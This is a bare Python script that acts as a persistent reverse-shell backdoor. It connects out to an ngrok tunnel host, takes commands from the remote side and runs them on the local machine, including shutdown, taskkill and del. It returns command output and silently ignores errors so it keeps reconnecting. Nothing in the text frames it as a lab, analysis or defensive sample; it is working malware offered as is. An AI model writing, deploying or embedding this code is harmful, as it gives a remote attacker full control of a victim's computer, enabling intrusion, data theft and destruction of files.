import socket,os

while True:
    try:
        port = 11877
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("0.tcp.ngrok.io",port))
        caract  = ["cd","start","cls","MSG","shutdown","py","taskkill","del"]
        while True:
            try:
                msg = str(s.recv(1024).decode("utf-8"))
                if((msg.split())[0] in caract):
                    os.system(msg)
                    s.sendall(b"[!]")
                else:
                    msg = bytes((os.popen(msg)).read(),"utf-8")
                    s.sendall(msg)
            except:
                pass
    except:
        pass
